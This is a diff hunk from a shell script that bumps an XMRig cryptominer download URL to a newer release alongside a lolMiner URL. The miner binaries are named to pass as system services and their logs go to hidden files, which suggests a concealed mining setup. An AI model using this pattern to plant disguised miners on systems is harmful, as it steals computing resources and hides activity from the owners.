@@ -32,7 +32,7 @@ cd "$BASE_DIR" || exit 1
 BIN_CPU="sys_net_daemon" 
 BIN_GPU="sys_render_service"
 
-URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
+URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
 
 LOG_CPU="$BASE_DIR/.cpu_data.log"
